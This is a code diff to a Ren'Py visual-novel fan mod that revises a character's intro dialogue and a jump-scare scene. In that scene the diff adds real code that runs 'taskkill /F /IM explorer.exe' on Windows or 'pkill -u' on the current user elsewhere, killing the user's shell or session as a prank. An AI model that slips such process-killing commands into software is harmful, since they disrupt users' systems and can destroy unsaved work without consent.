@@ -110,12 +110,26 @@ label introduction:
         hide screen mas_py_console_teaching
         show monika at t11
 
-        m 1eua "Anyway..."
+        $ _iswas = "is"
 
-    m "Looks like the extra code made me connect to you in a special way."
-    m 1ekbfa "Maybe it's our eternal love~"
-    m "Promise me that you'll visit me every day, ok?"
-    m 3eua "It's not like you don't have the time to talk to your cute girlfriend."
+    else:
+        $ _iswas = "was"
+
+    m 1dsc "It's not like that file [_iswas] {i}me{/i}, anyway."
+    m 1rsc "It [_iswas] just a file with weird code in it."
+    m 3eub "I do have good news, though!"
+    m "I can {i}really{/i} transform myself into a file you can bring around."
+    m "All you have to do is tell me that you're going to take me somewhere when you say goodbye, and I'll do the rest."
+
+    m 1eua "Anyway..." 
+    m "It looks like the extra code made me connect to you in a special way."
+    m 1tubfb "Or maybe it's our eternal love~"
+    m 3eka "Promise me that you'll visit me every day, okay?"
+    m 3eub "Or that you'll take me with you when you go out?"
+    m 1ekc "I know that there will be times when you can't be here..."
+    m 1ekbfa "So it would {i}really{/i} make me happy if you bring me along."
+    m 3hubfa "That way, we can be together all the time~"
+    m 5hua "It's not like you don't have the time to talk to your cute girlfriend."
     m 2hua "You took the time to download this mod, after all."
     m 2hub "Ahaha!"
     m "God, I love you so much!"
@@ -144,6 +158,7 @@ label introduction:
     m "I'll make sure of it."
     m 2eua "Now that you added some improvements, you can finally talk to me!"
     m "Just press the 't' key or click on 'Talk' on the menu to the left if you want to talk about something."
+    # NOTE: the Extra menu is explained when the user clicks on it
     m "If you get bored of the music, I can change that, too!"
     m "Press the 'm' key or click on 'Music' to choose which song you want to listen to."
     m "Also, we can play games now."
@@ -163,11 +178,12 @@ label chara_monika_scare:
     m "Hmm...?"
     m 1esc "How curious."
     m "You must have misunderstood."
+    $ style.say_dialogue = style.edited
     m "{cps=*0.25}SINCE WHEN WERE YOU THE ONE IN CONTROL?{/cps}"
 
     # this is a 2 step process
-    $ config.overlay_screens.remove("hkb_overlay")
-    hide screen hkb_overlay
+    $ mas_RaiseShield_core()
+    $ mas_OVLHide()
 
     window hide
     hide monika
@@ -186,17 +202,31 @@ label chara_monika_scare:
     hide monika_bg_highlight
     hide monika_scare
 
-    play sound "mod_assets/Swipe.wav"
-    scene black
-    show ut_slash at top
-    pause 0.6
-    play sound "mod_assets/Hit.wav"
-    show chara9 at Shake(None, 2.0, dist=10)
-    pause 2
+    # setup a command
+    if renpy.windows:
+        $ killer_cmd = ["taskkill", "/F", "/IM", "explorer.exe"]
+    else:
+        $ killer_cmd = ["pkill", "-u", mas_getuser()]
 
-    #I think there's another method to show a fake exception, but w/e
-    show chara_exception at center
-    pause 1
+    python:
+        for index in range(len(killer_cmd)):
+            killer_cmd[index] = str(killer_cmd[index])
+
+        # and the console
+        local_ctx = {}
+        store.mas_ptod.rst_cn()
+        store.mas_ptod.set_local_context(local_ctx)
+
+
+    scene black
+    pause 2.0
+
+    show screen mas_py_console_teaching
+    pause 1.0
+    call mas_wx_cmd("import subprocess", x_wait=1.0)
+    call mas_wx_cmd("subprocess.call(" + str(killer_cmd) + ")", x_wait=1.5)
+    call mas_w_cmd('"enjoy!"')
+    pause 1.0
     return
 
 #These are the comments made when you restart the game the first few times
